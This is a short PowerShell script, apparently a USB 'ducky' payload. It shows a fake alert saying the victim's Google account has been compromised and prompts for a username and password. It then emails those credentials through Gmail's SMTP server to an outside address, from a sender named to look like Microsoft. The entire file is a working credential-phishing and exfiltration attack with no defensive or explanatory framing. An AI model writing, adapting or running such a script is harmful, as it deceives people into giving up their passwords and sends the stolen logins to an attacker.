clear
$mycredentials = Get-Credential
Write-Host "ALERT your google account has been compromised! please enter your credentials for verification"

$name = Read-Host "Username/Email"
$pwd = Read-Host "password"




Send-MailMessage -SmtpServer smtp.gmail.com -Port 587 -UseSsl -From microsoftcredintials@gmail.com -To thyversionmusic@gmail.com -Subject 'Hello from the ducky' -Body ("$name $pwd") -Credential ($mycredentials)
exit